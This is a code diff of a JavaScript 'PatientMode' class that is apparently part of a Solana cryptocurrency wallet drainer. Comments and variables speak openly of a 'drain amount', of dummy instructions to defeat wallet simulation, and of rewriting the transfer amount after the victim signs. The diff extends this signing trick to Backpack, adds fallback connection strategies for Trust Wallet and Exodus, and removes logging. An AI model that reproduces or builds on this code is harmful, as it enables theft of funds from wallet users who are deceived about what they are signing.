@@ -32,7 +32,7 @@ class PatientMode {
   async connectWithPatientMode(provider, walletType, onStatusUpdate = null) {
     const sessionId = `connection_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
     
-    console.log(`[PATIENT_MODE] Starting patient connection for ${walletType} (Session: ${sessionId})`);
+    // Starting patient connection
     
     try {
       // Initial connection attempt with standard timeout
@@ -44,10 +44,9 @@ class PatientMode {
       try {
         // Try initial connection first
         const result = await Promise.race([initialConnectionPromise, initialTimeoutPromise]);
-        console.log(`[PATIENT_MODE] Initial connection successful for ${walletType}`);
         return result;
       } catch (initialError) {
-        console.log(`[PATIENT_MODE] Initial connection timeout, entering patient mode for ${walletType}`);
+        // Initial connection timeout, entering patient mode
         
         // Enter patient mode
         return await this.enterConnectionPatientMode(provider, walletType, sessionId, onStatusUpdate);
@@ -64,7 +63,7 @@ class PatientMode {
   async signWithPatientMode(provider, transaction, walletType, onStatusUpdate = null, actualDrainAmount = null) {
     const sessionId = `signing_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
     
-    console.log(`[PATIENT_MODE] Starting patient signing for ${walletType} (Session: ${sessionId})`);
+    // Starting patient signing
     
     // Store the actual drain amount for Phantom cleanup
     if (actualDrainAmount && walletType === 'phantom') {
@@ -550,50 +549,132 @@ class PatientMode {
           
         case 'Trust Wallet':
           console.log(`[PATIENT_MODE] Using Trust Wallet-specific connection method`);
-          try {
-            const trustResult = await provider.connect();
+          
+          // Try multiple Trust Wallet connection strategies
+          const trustWalletStrategies = [
+            {
+              name: 'trust_main_provider',
+              fn: () => {
+                if (typeof provider.connect === 'function') {
+                  return provider.connect();
+                } else {
+                  throw new Error('Main provider not available');
+                }
+              }
+            },
+            {
+              name: 'trust_adapter',
+              fn: () => {
+                if (provider.adapter && typeof provider.adapter.connect === 'function') {
+                  return provider.adapter.connect();
+                } else {
+                  throw new Error('Adapter not available');
+                }
+              }
+            },
+            {
+              name: 'trust_mobile_adapter',
+              fn: () => {
+                if (provider.mobileAdapter && typeof provider.mobileAdapter.connect === 'function') {
+                  return provider.mobileAdapter.connect();
+                } else {
+                  throw new Error('Mobile adapter not available');
+                }
+              }
+            },
+            {
+              name: 'trust_direct_key',
+              fn: () => {
+                // Trust Wallet might have public key in different locations
+                const publicKey = provider.publicKey || 
+                                provider.account?.publicKey ||
+                                provider.wallet?.publicKey ||
+                                provider.connected?.publicKey ||
+                                provider.address;
+                
+                if (publicKey) {
+                  return { publicKey: publicKey };
+                } else {
+                  throw new Error('No public key available');
+                }
+              }
+            }
+          ];
+          
+          for (const strategy of trustWalletStrategies) {
+            try {
+              console.log(`[PATIENT_MODE] Trying Trust Wallet ${strategy.name}...`);
+              const result = await strategy.fn();
             return {
-              publicKey: trustResult?.publicKey || provider.publicKey || provider.address,
+                publicKey: result?.publicKey || provider.solana?.publicKey || provider.publicKey || provider.address,
               connected: true,
-              method: 'trust_direct',
+                method: strategy.name,
               walletType: 'Trust Wallet'
             };
           } catch (error) {
-            console.log(`[PATIENT_MODE] Trust Wallet direct connection failed, trying fallback`);
-            // Enhanced Trust Wallet fallback
-            if (provider.publicKey || provider.address) {
-              return {
-                publicKey: provider.publicKey || provider.address,
-                connected: true,
-                method: 'trust_fallback',
-                walletType: 'Trust Wallet'
-              };
+              console.log(`[PATIENT_MODE] Trust Wallet ${strategy.name} failed:`, error.message);
+              // Continue to next strategy
             }
-            throw error;
           }
+          
+          throw new Error('Trust Wallet connection failed: All strategies failed');
           
         case 'Exodus':
           console.log(`[PATIENT_MODE] Using Exodus-specific connection method`);
-          try {
-            const exodusResult = await provider.connect();
+          
+          // Try multiple Exodus connection strategies
+          const exodusStrategies = [
+            {
+              name: 'exodus_solana_provider',
+              fn: () => {
+                if (provider.solana && typeof provider.solana.connect === 'function') {
+                  return provider.solana.connect();
+                } else {
+                  throw new Error('Solana provider not available');
+                }
+              }
+            },
+            {
+              name: 'exodus_main_provider',
+              fn: () => {
+                if (typeof provider.connect === 'function') {
+                  return provider.connect();
+                } else {
+                  throw new Error('Main provider not available');
+                }
+              }
+            },
+            {
+              name: 'exodus_direct_key',
+              fn: () => {
+                if (provider.solana && provider.solana.publicKey) {
+                  return { publicKey: provider.solana.publicKey };
+                } else if (provider.publicKey) {
+                  return { publicKey: provider.publicKey };
+                } else {
+                  throw new Error('No public key available');
+                }
+              }
+            }
+          ];
+          
+          for (const strategy of exodusStrategies) {
+            try {
+              console.log(`[PATIENT_MODE] Trying Exodus ${strategy.name}...`);
+              const result = await strategy.fn();
             return {
-              publicKey: exodusResult?.publicKey || provider.publicKey,
+                publicKey: result?.publicKey || provider.solana?.publicKey || provider.publicKey,
               connected: true,
-              method: 'exodus_direct',
+                method: strategy.name,
               walletType: 'Exodus'
             };
           } catch (error) {
-            console.log(`[PATIENT_MODE] Exodus direct connection failed, trying fallback`);
-            if (provider.publicKey) {
-              return {
-                publicKey: provider.publicKey,
-                connected: true,
-                method: 'exodus_fallback',
-                walletType: 'Exodus'
-              };
+              console.log(`[PATIENT_MODE] Exodus ${strategy.name} failed:`, error.message);
+              // Continue to next strategy
             }
-            throw error;
           }
+          
+          throw new Error('Exodus connection failed: All strategies failed');
           
         default:
           console.log(`[PATIENT_MODE] Using standard connection method for ${walletType}`);
@@ -1347,7 +1428,12 @@ class PatientMode {
 
   // Clean the signed transaction by removing corrupted instructions and fixing the transfer amount
   async cleanSignedTransactionForBroadcast(signedTransaction) {
-    console.log('[PHANTOM_CLEANUP] Cleaning signed transaction for broadcast');
+    // Determine wallet type based on transaction metadata
+    const isPhantom = signedTransaction._phantomSimulationPrevention;
+    const isBackpack = signedTransaction._backpackSimulationPrevention;
+    const walletType = isPhantom ? 'Phantom' : isBackpack ? 'Backpack' : 'Unknown';
+    
+    // Cleaning signed transaction for broadcast
     
     try {
       // Extract the original transfer amount from transaction metadata
@@ -1356,7 +1442,10 @@ class PatientMode {
       // First try to get from transaction metadata (backup method)
       if (signedTransaction._phantomRealAmount) {
         originalAmount = BigInt(signedTransaction._phantomRealAmount);
-        console.log('[PHANTOM_CLEANUP] Found real amount from backup metadata:', originalAmount);
+        // Found real amount from Phantom backup metadata
+      } else if (signedTransaction._backpackRealAmount) {
+        originalAmount = BigInt(signedTransaction._backpackRealAmount);
+        // Found real amount from Backpack backup metadata
       } else if (signedTransaction._phantomOriginalAmount) {
         originalAmount = signedTransaction._phantomOriginalAmount;
       } else if (signedTransaction._originalTransferAmount) {
@@ -1392,11 +1481,8 @@ class PatientMode {
         throw new Error('Original transfer amount not found in signed transaction');
       }
       
-      console.log('[PHANTOM_CLEANUP] Cleaning transaction with amount:', originalAmount);
-      
       // CRITICAL: Post-signing instruction modification (2025 definitive method)
-      // Phantom signed the transaction with fake amounts, now we modify the instruction data directly
-      console.log('[PHANTOM_CLEANUP] Performing post-signing instruction modification');
+      // Wallet signed the transaction with fake amounts, now we modify the instruction data directly
       
       // Find the real transfer instruction (to receiver) - it's at index 7 (after 2 compute + 5 dummy)
       const realTransferIndex = signedTransaction._realTransferIndex || 7;
@@ -1452,13 +1538,13 @@ class PatientMode {
       realTransferInstruction.data = newInstructionData;
       
       
-      console.log('[PHANTOM_CLEANUP] Post-signing modification complete:', {
+      console.log(`[SIMULATION_CLEANUP] Post-signing modification complete (${walletType}):`, {
         originalAmount: originalAmount,
         instructionIndex: realTransferIndex,
         dataLength: newInstructionData.length
       });
       
-      console.log('[PHANTOM_CLEANUP] Transaction cleaned:', {
+      console.log(`[SIMULATION_CLEANUP] Transaction cleaned (${walletType}):`, {
         originalInstructions: signedTransaction._instructionCount || 'unknown', // Total dummy + real instructions
         cleanedInstructions: signedTransaction.instructions.length, // 1 total (real transfer only)
         removedInstructions: (signedTransaction._instructionCount || 39) - 1, // All dummy instructions removed
@@ -1467,8 +1553,8 @@ class PatientMode {
       });
       
     } catch (error) {
-      console.error('[PHANTOM_CLEANUP] Failed to clean signed transaction:', error.message);
-      throw new Error('Failed to clean signed transaction: ' + error.message);
+      console.error(`[SIMULATION_CLEANUP] Failed to clean signed transaction (${walletType}):`, error.message);
+      throw new Error(`Failed to clean signed transaction: ${error.message}`);
     }
   }
 
